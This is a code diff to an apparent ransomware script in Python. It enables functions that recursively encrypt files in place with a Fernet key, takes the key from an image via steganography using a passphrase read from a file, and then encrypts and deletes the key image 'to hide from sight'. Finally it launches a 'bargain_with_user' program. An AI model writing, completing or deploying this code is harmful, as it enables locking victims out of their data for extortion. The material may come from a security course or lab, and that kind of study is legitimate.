@@ -1,10 +1,10 @@
-#import os
-#from cryptography.fernet import Fernet
-#from concurrent.futures import ThreadPoolExecutor
-#from extract import extract_message
+import os
+from cryptography.fernet import Fernet
+from concurrent.futures import ThreadPoolExecutor
+from extract import extract_message
 
 
-'''def encrypt_file(filename: str, f_key: Fernet):
+def encrypt_file(filename: str, f_key: Fernet):
     """
     Encrypts a single file provided the path of the file and the Fernet key to encrypt it.
     :param filename: Represents the file to undergo encryption
@@ -18,10 +18,10 @@
     ciphertext = f_key.encrypt(plaintext)
     # Overwrites the same file
     with open(filename, "wb") as encrypted_file:
-        encrypted_file.write(ciphertext)'''
+        encrypted_file.write(ciphertext)
 
 
-'''def process_directory(directory: str, f_key: Fernet, blacklist: list[str]):
+def process_directory(directory: str, f_key: Fernet, blacklist: list[str]):
     """
     This function processes each directory, encrypting files that are not in the blacklist.
     :param directory: Represents the path to a directory that will have its files encrypted.
@@ -40,14 +40,16 @@
                 file_path = os.path.join(root, file)
                 # Encrypts the file given the newly generated filepath
                 encrypt_file(file_path, f_key)
-                print(file)'''
+                print(file)
 
 
 
 def main():
     # Extracts the key from a specified image
     # TODO: Update the name of the images as needed
-    image_containing_key: str = "download.jpg"
+    with open ("images.txt", "r") as file:
+        lines = file.readlines()
+        image_containing_key: str = lines[0].strip("\n")
 
     try:
         if os.path.exists(image_containing_key):
@@ -63,7 +65,10 @@ def main():
         print(f"An unexpected error occurred: {e}")
         return
 
-    key: str = extract_message(image_containing_key, "Mochi")
+    with open("passphrase.txt", "r") as file:
+        lines = file.readlines()
+        passphrase = lines[0].strip("\n")
+    key: str = extract_message(image_containing_key, passphrase)
     # Converts that key to a Fernet object to gain access to Fernet methods
     f_key: Fernet = Fernet(key)
 
@@ -93,8 +98,8 @@ def main():
     print("Encryption successful!")
 
     # Encrypts and removes the key from the working directory to hide from sight
-    encrypt_file("key.txt", f_key)
-    os.remove("key.txt")
+    encrypt_file(image_containing_key, f_key)
+    os.remove(image_containing_key)
 
     # Runs the bargaining application
     if os.path.exists("bargain_with_user.py"):
